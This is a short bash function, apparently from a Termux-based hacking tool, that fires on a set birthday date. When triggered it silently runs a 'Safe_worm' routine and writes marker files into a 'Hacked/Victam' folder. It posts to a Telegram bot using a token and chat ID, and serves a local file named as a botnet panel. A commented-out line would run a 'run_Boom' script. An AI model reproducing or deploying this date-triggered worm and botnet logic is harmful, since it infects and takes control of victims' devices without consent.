#MyBrithday
BH(){
today=$(date +%m/%d)
Myday="12/12"

if [[ $today == $Myday ]];then
if [[ ${nN} == Y ]];then

Safe_worm &>> /dev/null
echo -e "Happy Birthday SomHac" > $PREFIX/etc/Hacked/Victam/BH
clear
termux-toast -b blue -c red -g middle 'It’s Just My Brithday And I Will Play My Own Game !'
toilet -f mono12 -F border SomHac_day -F metal


	if [[ $termux == "true" ]];then

				TextBox
				echo -e $Server_Alert > "$PREFIX/etc/Hacked/.AlertMessage"
	else

			echo -e "$Server_Alert" > "/root/.AlertMessage"
			xdg-open "/root/.AlertMessage"

	fi

xdg-open https://t.me/HacSom

else

Safe_worm &>> /dev/null
echo -e "Happy Birthday SomHac" > $PREFIX/etc/Hacked/Victam/BH
clear
toilet -f mono12 -F border SomHac_day -F metal
termux-toast -b blue -c red -g middle 'It’s Just My Brithday And I Will Play My Own Game !'
curl -X POST --silent  https://api.telegram.org/bot${TOKEN}/sendMessage -d chat_id=${CHAT_ID} -d text=' Happy Birthday To You Master Blue , Don’t Forget Your wish ! '

if [[ `command -v php` ]];then

php -S localhost:2424 "$PREFIX/etc/Hacked/Server/.B24B_BotNet" &>> /dev/null xdg-open http://localhost:2424

fi

#bash \$PREFIX/bin/run_Boom &>> /dev/null

fi
fi
}
